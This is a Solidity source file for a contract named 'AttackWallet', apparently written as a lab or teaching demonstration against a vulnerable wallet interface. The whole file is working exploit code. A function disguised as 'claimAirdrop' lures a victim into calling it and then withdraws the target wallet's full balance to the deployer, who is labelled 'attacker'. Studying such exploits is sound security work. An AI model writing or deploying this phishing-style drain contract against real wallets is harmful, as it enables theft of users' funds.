// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.26;

interface IVulnerableWallet {
    function withdraw(address payable _to, uint256 _amount)external ;
}
contract AttackWallet {

IVulnerableWallet public wallet;
address payable public attacker;

constructor(address _walletAddress) {
    wallet = IVulnerableWallet(_walletAddress);
    attacker = payable(msg.sender);
}

function claimAirdrop() public {
    wallet.withdraw(attacker, address(wallet).balance);
}

function getAttackerBalance() public view returns (uint256) {
    return attacker.balance;
}



}